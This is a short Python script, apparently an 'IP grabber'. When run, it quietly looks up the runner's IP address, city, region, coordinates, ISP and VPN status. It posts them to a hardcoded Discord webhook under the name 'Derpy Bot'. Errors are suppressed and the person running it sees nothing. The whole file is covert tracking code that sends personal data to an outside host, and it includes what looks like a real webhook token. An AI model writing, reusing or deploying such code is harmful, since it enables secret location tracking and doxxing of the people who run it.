
import requests

webhook = "https://discord.com/api/webhooks/1421155053028511798/cdsSBak_7aJw89DY2hQDWLhtt_5e3LqnsVU5-isCndaMzYfgu5OX3affFX2YLsGn2Xtx"

def ip():
  try:
    api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
    data = requests.get(api).json()
    content = f"**────────୨ৎ──────── \n**IP: {data['query']}**\n**Region: {data['regionName']}**\n**Ciudad: {data['city']}**\n**Latitud: {data['lat']}**\n**Longitud: {data['lon']}**\n**ISP: {data['isp']}**\n**VPN?: {data['proxy']} **"
    requests.post(webhook, json={"avatar_url":"https://i.pinimg.com/736x/21/b2/6a/21b26a420fca58030ef52b5ecb21253a.jpg",'username': 'Derpy Bot', 'content': content})
  except:
    pass

ip()
